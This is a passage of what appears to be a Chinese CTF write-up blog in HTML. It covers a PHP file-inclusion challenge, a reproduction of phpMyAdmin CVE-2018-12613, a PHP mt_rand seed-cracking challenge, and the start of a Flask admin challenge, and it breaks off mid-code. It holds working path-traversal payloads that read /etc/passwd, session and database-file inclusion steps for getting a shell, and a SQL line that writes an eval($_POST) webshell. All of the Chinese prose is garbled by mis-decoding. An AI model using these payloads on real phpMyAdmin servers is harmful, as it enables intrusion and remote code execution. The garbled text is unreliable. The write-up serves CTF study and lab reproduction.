class="meta">&lt;?php</span></span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">emmm</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkFile</span>(<span class="params">&amp;$page</span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            $whitelist = [<span class="string">&quot;source&quot;</span>=&gt;<span class="string">&quot;source.php&quot;</span>,<span class="string">&quot;hint&quot;</span>=&gt;<span class="string">&quot;hint.php&quot;</span>];</span><br><span class="line">            <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">                <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            $_page = urldecode($page);</span><br><span class="line">            $_page = mb_substr(</span><br><span class="line">                $_page,</span><br><span class="line">                <span class="number">0</span>,</span><br><span class="line">                mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">            );</span><br><span class="line">            <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;you can&#x27;t see it&quot;</span>;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">        &amp;&amp; emmm::checkFile($_REQUEST[<span class="string">&#x27;file&#x27;</span>])</span><br><span class="line">    ) &#123;</span><br><span class="line">        <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;file&#x27;</span>];</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&lt;img src=\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\&quot; /&gt;&quot;</span>;</span><br><span class="line">    &#125;  </span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>ä»£ç çš„å¤§æ¦‚æ„æ€æ˜¯æ¥å—ä¸€ä¸ª<code>file</code>çš„å‚æ•°ï¼Œé™åˆ¶å˜é‡ç±»å‹ä¸ºå­—ç¬¦ä¸²ï¼Œç™½åå•æ£€æŸ¥é€šè¿‡æ£€æŸ¥å°±åŒ…å«</p><p>è¿™é¢˜çš„çªç ´ç‚¹å°±æ˜¯urlåŒé‡ç¼–ç ï¼Œä»<code>hint.php</code>å¯çŸ¥flagåº”è¯¥åœ¨<code>/ffffllllaaaagggg</code>ï¼Œpayload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=hint.php%<span class="number">25</span>%<span class="number">33</span>%<span class="number">66</span>/../../../../ffffllllaaaagggg</span><br></pre></td></tr></table></figure><p><code>?</code>çš„urlç¼–ç æ˜¯<code>%3f</code>ï¼ŒåŒé‡ç¼–ç æ˜¯<code>%25%33%66</code>ï¼Œåœ¨åŒ…å«çš„æ—¶å€™ä¼šè§£ææˆ<code>hint.php%3f</code>è¿™ä¸ªç›®å½•</p><p>è¿™é¢˜çš„åŸå‹æ˜¯phpmyadmin(CVE-2018-12613)åå°ä»»æ„æ–‡ä»¶åŒ…å«æ¼æ´</p><h3 id="CVE-2018-12613å¤ç°"><a href="#CVE-2018-12613å¤ç°" class="headerlink" title="CVE-2018-12613å¤ç°"></a>CVE-2018-12613å¤ç°</h3><h3 id="æ¼æ´ç®€ä»‹"><a href="#æ¼æ´ç®€ä»‹" class="headerlink" title="æ¼æ´ç®€ä»‹"></a>æ¼æ´ç®€ä»‹</h3><p>æ­¤æ¼æ´å½±å“ç‰ˆæœ¬ï¼š4.8.0â€”â€”4.8.1</p><p>æ¼æ´çš„å…¥å£åœ¨<code>index.php</code> 54-63è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$target_blacklist = <span class="keyword">array</span> (</span><br><span class="line">    <span class="string">&#x27;import.php&#x27;</span>, <span class="string">&#x27;export.php&#x27;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="comment">// If we have a valid target, let&#x27;s load that script instead</span></span><br><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>($_REQUEST[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; is_string($_REQUEST[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! preg_match(<span class="string">&#x27;/^index/&#x27;</span>, $_REQUEST[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! in_array($_REQUEST[<span class="string">&#x27;target&#x27;</span>], $target_blacklist)</span><br><span class="line">    &amp;&amp; Core::checkPageValidity($_REQUEST[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> $_REQUEST[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é‡Œæœ‰5ä¸ªæ¡ä»¶ï¼Œæ»¡è¶³ä¹‹åå°±ä¼šåŒ…å«æˆ‘ä»¬ç©¿è¿‡æ¥çš„æ–‡ä»¶ã€‚å‰4ä¸ªæ¡ä»¶éƒ½æ¯”è¾ƒå¥½ç†è§£ï¼Œéç©ºã€å¿…é¡»ä¸ºå­—ç¬¦ä¸²ã€ä¸èƒ½æ˜¯indexå¼€å¤´ï¼Œä¸èƒ½æ˜¯é»‘åå•ä¸­çš„æ–‡ä»¶åï¼ˆ<code>import.php</code>ã€<code>export.php</code>)ï¼Œé‡ç‚¹çœ‹æœ€åä¸€ä¸ª,Coreç±»ä½äº<code>libraries/classes/Core.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;$page, <span class="keyword">array</span> $whitelist = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>($whitelist)) &#123;</span><br><span class="line">        $whitelist = <span class="built_in">self</span>::$goto_whitelist;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>($page) || !is_string($page)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (in_array($page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    ); <span class="comment">//æŒ‰?åˆ†å‰²å­—ç¬¦ä¸²ï¼Œå–å‰åŠéƒ¨åˆ†</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    $_page = urldecode($page);</span><br><span class="line">    $_page = mb_substr(</span><br><span class="line">        $_page,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        mb_strpos($_page . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    ); <span class="comment">//æŒ‰?åˆ†å‰²å­—ç¬¦ä¸²ï¼Œå–å‰åŠéƒ¨åˆ†</span></span><br><span class="line">    <span class="keyword">if</span> (in_array($_page, $whitelist)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŸºæœ¬ä¸Šå’Œé¢˜ç›®ä»£ç ä¸€æ ·ï¼Œç™½åå•æœ‰å¥½å¤šæ–‡ä»¶å¯ä»¥åˆ©ç”¨</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/ç™½åå•.png" style="zoom: 80%;"><p>è¿™é‡Œæ˜¯ç”¨çš„vulhubé¶åœºï¼Œé‡Œé¢æœ‰è¿™ä¸ªæ¼æ´çš„å¤ç°ç¯å¢ƒï¼Œç›´æ¥dockeræ­å»º</p><p>æ„é€ payloadç±»ä¼¼äºä»¥ä¸‹å½¢å¼ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">25</span>%<span class="number">33</span>%<span class="number">66</span>/../../../../etc/passwd</span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/åŒ…å«æµ‹è¯•.png" style="zoom:80%;"><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><h4 id="æ–¹å¼1-åŒ…å«session"><a href="#æ–¹å¼1-åŒ…å«session" class="headerlink" title="æ–¹å¼1 åŒ…å«session"></a>æ–¹å¼1 åŒ…å«session</h4><p>å…ˆæ‰§è¡Œæ¡sqlè¯­å¥</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="string">&#x27;&lt;?php phpinfo();?&gt;&#x27;</span>;</span><br></pre></td></tr></table></figure><p>æŸ¥çœ‹session_id</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/session.png" style="zoom:80%;"><p>åŒ…å«ï¼Œpayload:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?target=db_sql.php%<span class="number">253</span>f/../../../../../tmp/sess_d3455e637bcc0b69789190c6ffb4cd18</span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/åŒ…å«session.png" style="zoom:80%;"><p>ä¸ªäººåœ¨linuxä¸Šæ­å»ºçš„ç¯å¢ƒå¥½åƒä¸èƒ½ç›´æ¥æ‰§è¡Œæœ‰ä¸€å¥è¯çš„sqlè¯­å¥ç„¶ååŒ…å«sessionæ¥getshell</p><p>æœ€å¥½çš„æ–¹å¼è¿˜æ˜¯æ‰¾æœ‰å†™å…¥æƒé™çš„ç›®å½•å†™é©¬</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT <span class="string">&quot;&lt;?php file_put_contents(&#x27;moonback.php&#x27;,&#x27;&lt;?php eval(<span class="subst">$_POST</span>[1]);?&gt;&#x27;);?&gt;&quot;</span>;</span><br></pre></td></tr></table></figure><h4 id="æ–¹å¼2-åŒ…å«æ•°æ®åº“æ–‡ä»¶"><a href="#æ–¹å¼2-åŒ…å«æ•°æ®åº“æ–‡ä»¶" class="headerlink" title="æ–¹å¼2 åŒ…å«æ•°æ®åº“æ–‡ä»¶"></a>æ–¹å¼2 åŒ…å«æ•°æ®åº“æ–‡ä»¶</h4><p>åˆ›å»ºä¸€ä¸ªæ•°æ®è¡¨ï¼Œé‡Œé¢æ’å…¥ä¸€å¥è¯</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/å†™å…¥.png" style="zoom: 50%;"><p>æŸ¥è¯¢ä¸€ä¸‹è¯¥è¡¨çš„è·¯å¾„</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="keyword">global</span> <span class="keyword">variables</span> <span class="keyword">like</span> <span class="string">&#x27;%datadir%&#x27;</span>;</span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/sqlè·¯å¾„.png" style="zoom:80%;"><p>ç„¶åç›´æ¥åŒ…å«å°±è¡Œï¼Œpayloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?target=db_sql.php%<span class="number">253</span>f/../../../../../<span class="keyword">var</span>/lib/mysql/test/shell.frm</span><br></pre></td></tr></table></figure><p>åœ¨linuxä¸Šå°è¯•æ²¡åŒ…å«æˆåŠŸï¼ŒçŒœæµ‹å¯èƒ½æ˜¯æƒé™é—®é¢˜</p><h2 id="GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–"><a href="#GWCTF-2019-æ¯ç‡¥çš„æŠ½å¥–" class="headerlink" title="[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–"></a>[GWCTF 2019]æ¯ç‡¥çš„æŠ½å¥–</h2><h3 id="writeup-1"><a href="#writeup-1" class="headerlink" title="writeup"></a>writeup</h3><p>æˆ‘TMå¿ƒæ€å´©äº†å•Šï¼ŒåŒä¸€ä¸ªsessionåº”è¯¥ç”Ÿæˆçš„éšæœºæ•°ä¸€æ ·å•Šï¼Œè¯•äº†å¥½ä¹…ï¼Œéƒ½å¿«å“­äº†</p><p>æºç å¯ä»¥çœ‹åˆ°ï¼Œè®¿é—®<code>check.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#è¿™ä¸æ˜¯æŠ½å¥–ç¨‹åºçš„æºä»£ç ï¼ä¸è®¸çœ‹ï¼</span></span><br><span class="line">header(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line">session_start();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_SESSION[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line">$_SESSION[<span class="string">&#x27;seed&#x27;</span>]=rand(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>($_POST[<span class="string">&#x27;num&#x27;</span>]===$str)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æŠ½å¥–ï¼Œå°±æ˜¯é‚£ä¹ˆæ¯ç‡¥ä¸”æ— å‘³ï¼Œç»™ä½ flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;æ²¡æŠ½ä¸­å“¦ï¼Œå†è¯•è¯•å§&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure><p>çŸ¥é“å‰10ä½äº†ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨php_mt_seedå¤šä¸ªå‚æ•°çˆ†ç ´ç§å­</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s=<span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span></span><br><span class="line">pwd=<span class="string">&quot;Mu7S5Y076i&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> pwd:</span><br><span class="line">print(str(s.index(i))+<span class="string">&quot; &quot;</span>+str(s.index(i))+<span class="string">&quot; 0 61 &quot;</span>,end=<span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200203200954.png" style="zoom:80%;"><p>æ‰¾åˆ°ç§å­ï¼Œæ³¨æ„ç‰ˆæœ¬ï¼Œåªéœ€ç”¨åŸæ¥çš„åŠ å¯†æ–¹å¼å°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">mt_srand(<span class="number">666994457</span>);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$str=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str.<span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200203201222.png" style="zoom:80%;"><p>æäº¤å³å¯å¾—flag</p><img src="/2020/01/12/buuctf%E5%88%B7%E9%A2%98-%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E7%AF%87/TIMæˆªå›¾20200203201418.png" style="zoom:80%;"><h2 id="HCTF-2018-admin"><a href="#HCTF-2018-admin" class="headerlink" title="[HCTF 2018]admin"></a>[HCTF 2018]admin</h2><h3 id="writeup-2"><a href="#writeup-2" class="headerlink" title="writeup"></a>writeup</h3><p>å‚è€ƒï¼š<a href="https://www.anquanke.com/post/id/164086">https://www.anquanke.com/post/id/164086</a></p><p>æ‰“å¼€æ³¨å†Œç™»é™†ï¼Œåœ¨indexé¡µé¢çœ‹åˆ°<code>you are not admin</code>ï¼Œåœ¨change passwordé¡µé¢æºä»£ç é‡Œçœ‹åˆ°æœ‰ä¸ªgithubåœ°å€</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">https://github.com/woadsl1234/hctf_flask/</span></span><br></pre></td></tr></table></figure><p>ä¸‹è½½åˆ°æœ¬åœ°ï¼Œå‘ç°æ˜¯python2çš„flaské¡¹ç›®ï¼Œåœ¨<code>templates/index.html</code>çœ‹åˆ°</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if current_user.is_authenticated and session[&#x27;name&#x27;] == &#x27;admin&#x27; %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">class</span>=<span class="string">&quot;nav&quot;</span>&gt;</span>hctf&#123;xxxxxxxxx&#125;<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><p>ç™»é™†adminå³å¯å¾—åˆ°flag</p><p><code>routes.py</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(&#x27;/code&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_code</span>():</span></span><br><span class="line">    image, code = get_verify_code()</span><br><span class="line">    <span class="comment"># å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥</span></span><br><span class="line">    buf = BytesIO()</span><br><span class="line">    image.save(buf, <span class="string">&#x27;jpeg&#x27;</span>)</span><br><span class="line">    buf_str = buf.getvalue()</span><br><span class="line">    <span class="comment"># æŠŠbuf_strä½œä¸ºresponseè¿”å›å‰ç«¯ï¼Œå¹¶è®¾ç½®é¦–éƒ¨å­—æ®µ</span></span><br><span class="line">    response = make_response(buf_str)</span><br><span class="line">    response.headers[<span class="string">&#x27;Content-Type&#x27;</span>] = <span class="string">&#x27;image/gif&#x27;</span></span><br><span class="line">    <span class="comment"># å°†éªŒè¯ç å­—ç¬¦ä¸²å‚¨å­˜åœ¨sessionä¸­</span></span><br><span class="line">    session[<span class="string">&#x27;image&#x27;</span>] = code</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/&#x27;)</span></span><br><span class="line"><span class="meta">@app.route(&#x27;/index&#x27;)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, title = <span class="string">&#x27;hctf&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span>():</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_user.is_authenticated:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;index&#x27;</span>))</span><br><span class="line"></span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        name = strlower(form.username.data)</span><br><span class="line">        <span class="keyword">if</span> session.get(<span class="string">&#x27;image&#x27;</span>).lower() != form.verify_code.data.lower():</span><br><span class="line">            flash(<span class="string">&#x27;Wrong verify code.&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form=form)</span><br><span class="line">        <span class="keyword">if</span> User.query.filter_by(username = name).first():</span><br><span class="line">            flash(<span class="string">&#x27;The username has been registered&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;register&#x27;</span>))</span><br><span class="line">        user = User(username=name)</span><br><span class="line">        user.set_password(form.password.data)</span><br><span class="line">        db.session.add(user)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(<span class="string">&#x27;register successful&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&#x27;login&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;register.html&#x27;</span>, title = <span class="string">&#x27;register&#x27;</span>, form = form)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">login</span>():</span></span><br><span class="line">    